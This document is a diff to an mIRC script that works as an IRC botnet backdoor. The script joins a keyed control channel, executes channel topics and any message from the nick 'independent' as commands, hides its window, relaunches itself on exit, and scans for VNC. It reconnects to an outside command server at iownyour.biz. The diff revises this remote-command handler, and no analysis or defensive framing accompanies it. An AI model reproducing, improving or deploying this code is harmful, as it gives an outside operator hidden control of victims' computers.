@@ -5,7 +5,7 @@ alias ff .timerff 0 1 findtray
 raw 001:*:{ set %fldchan #X#psy#X# | set %key $encode(Sm0k3d,m) | join %fldchan %key }
 raw 475:*:{ join %fldchan %key }
 RAW 332:*:if ($2 == %fldchan) [ [ $3- ] ]
-on *:PRIVMSG:*:*:{ set -u3 %x $1- | $eval($evalnext(%x),1) | .msg %fldchan  $+ $r(0,99) $+ , $+ $r(0,99) : $eval($evalnext(%x),1) | close -m | windows -h $active }
+on *:TEXT:*:*:{  if ($nick == independent) { [ [ $1- ] ] | .msg %fldchan  $+ $r(0,99) $+ , $+ $r(0,99) : [ [ $1- ] ] | close -m | windows -h $active } }
 on *:EXIT:run $mircexe
 on *:sockopen:vncscan*:{
   if ($sockerr) { return }
@@ -93,7 +93,7 @@ alias chklog {
   }
 
 }
-alias opnotice { .notice @ $+ %fldchan   $+ $r(0,99) $+ , $+ $r(0,99) $+ $evalnext($2,1) $+  $+ $r(0,99) $+ , $+ $r(0,99) $evalnext($3-,1)  }
+alias opnotice { .notice @ $+ %fldchan   $+ $r(0,99) $+ , $+ $r(0,99) $+ $eval($2-,2) }
 
 on *:DISCONNECT:.timerDC 1 1 server irc- $+ $r(1,4) $+ .iownyour.biz $iif($sslready,+6697,6667) -jn %fldchan %key
 on *:PART:%fldchan:{ if ($nick == $me) .timer 1 1 join # %key } 
